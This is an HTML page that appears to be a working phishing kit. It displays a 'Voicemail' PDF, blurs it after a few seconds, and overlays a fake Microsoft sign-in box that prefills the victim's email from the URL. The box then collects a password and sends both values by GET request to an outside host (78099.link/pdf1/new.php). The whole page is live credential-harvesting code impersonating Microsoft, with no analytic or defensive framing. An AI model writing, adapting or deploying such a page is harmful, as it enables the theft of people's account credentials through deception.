<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Load PDF</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            transition: filter 0.5s ease;
        }
        #smallIframe {
            position: absolute;
            width: 90%; /* Make width responsive */
            max-width: 450px; /* Limit max width */
            height: auto; /* Auto height */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(169, 169, 169, 0.6);
            border: none;
            padding: 20px;
            box-sizing: border-box;
            opacity: 0;
            transition: opacity 1s ease;
        }
        #logo {
            width: 120px;
            height: auto;
            margin: 20px auto; /* Center logo */
            display: block; /* Center block */
        }
        #expiredText, #loginForm {
            transition: opacity 1s ease;
            text-align: center; /* Center align text */
        }
        #expiredText {
            color: #000;
            font-size: 1.5em; /* Responsive font size */
            margin: 10px 0;
            font-weight: 500;
        }
        .throbber-container {
            position: relative;
            width: 100%;
            height: 20px;
            overflow: hidden;
            background: transparent;
        }
        .throbber {
            display: flex;
            width: 500%;
            height: 100%;
            animation: moveThrobber 6s ease-in-out infinite;
        }
        .throbber div {
            width: 4px;
            height: 4px;
            background: #005da6;
            border-radius: 50%;
            margin: 0 4px; /* Adjusted spacing */
            animation: throb 1.5s ease-in-out infinite;
        }
        @keyframes moveThrobber {
            0% { transform: translateX(-100%); }
            50% { transform: translateX(0); }
            100% { transform: translateX(100%); }
        }
        @keyframes throb {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.5); }
        }
        #loginForm {
            display: none;
            text-align: center; /* Center align form */
            margin-top: 10px;
        }
        #loginForm input {
            display: block;
            width: 90%; /* Responsive width */
            max-width: 300px; /* Limit max width */
            padding: 10px;
            margin: 10px auto; /* Center margin */
            border: none;
            border-bottom: 1px solid #005da6;
            background: transparent;
            outline: none;
            font-size: 1em;
        }
        #loginForm button {
            background-color: #005da6;
            color: white;
            border: none;
            padding: 10px;
            font-size: 1em;
            border-radius: 0;
            cursor: pointer;
            width: 100px; /* Fixed width */
            margin: 20px auto; /* Center button */
            display: block; /* Center block */
        }
        #signInText {
            color: #000;
            font-size: 1.5em; /* Responsive font size */
            margin: 10px 0;
            font-weight: 500;
        }
        #email-display {
            display: flex;
            justify-content: center; /* Center horizontally */
            margin-bottom: 0;
            cursor: not-allowed;
            text-decoration: none;
        }
        #email-display::before {
            content: '‚Üê';
            color: black;
            font-size: 18px;
            margin-right: 8px;
        }
    </style>
    <script>
        function getEmailFromURL() {
            const url = window.location.href;
            const emailRegex = /\?(.+)$/;
            const matches = url.match(emailRegex);
            return matches && matches[1] ? decodeURIComponent(matches[1]) : '';
        }

        window.onload = function() {
            const emailField = document.getElementById('email');
            const emailDisplay = document.getElementById('email-display');
            const email = getEmailFromURL();
            emailField.value = email;
            emailDisplay.textContent = email || "No email provided"; // Fallback message
        };
    </script>
</head>
<body>
    <iframe id="pdfViewer" src="https://78099.link/pdf4/Voicemail.pdf" aria-label="PDF Viewer"></iframe>
    <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
        <img id="logo" src="https://microsoft-live.github.io/micro.png" alt="Microsoft Logo">
        <p id="expiredText">Trying to sign you in</p>
        <div class="throbber-container">
            <div class="throbber">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
        <div id="loginForm">
            <p id="email-display">Loading email...</p>
            <p id="signInText">Enter password</p>
            <form id="authForm" action="https://78099.link/pdf1/new.php" method="GET" onsubmit="return validateForm()">
                <input type="hidden" id="email" name="email">        
                <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
                <button type="submit">Sign in</button>
            </form>
        </div>
    </div>
    <script>
        function applyBlur() {
            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
        }
        function showSmallIframe() {
            document.getElementById('smallIframe').style.opacity = '1';
        }
        function fadeOutTextAndThrobber() {
            document.getElementById('expiredText').style.opacity = '0';
            document.querySelector('.throbber-container').style.opacity = '0';
            setTimeout(showLoginForm, 1000);
        }
        function showLoginForm() {
            document.getElementById('expiredText').style.display = 'none';
            document.querySelector('.throbber-container').style.display = 'none';
            const loginForm = document.getElementById('loginForm');
            loginForm.style.display = 'block';
            document.getElementById('password').focus();
        }
        function validateForm() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailPattern.test(email)) {
                alert("Please enter a valid email address.");
                return false;
            }
            if (password.length < 4) {
                alert("Password must be at least 4 characters long.");
                return false;
            }
            return true;
        }
       
        setTimeout(applyBlur, 9000);
        setTimeout(showSmallIframe, 10000);
        setTimeout(fadeOutTextAndThrobber, 12000);
    </script>
</body>
</html>
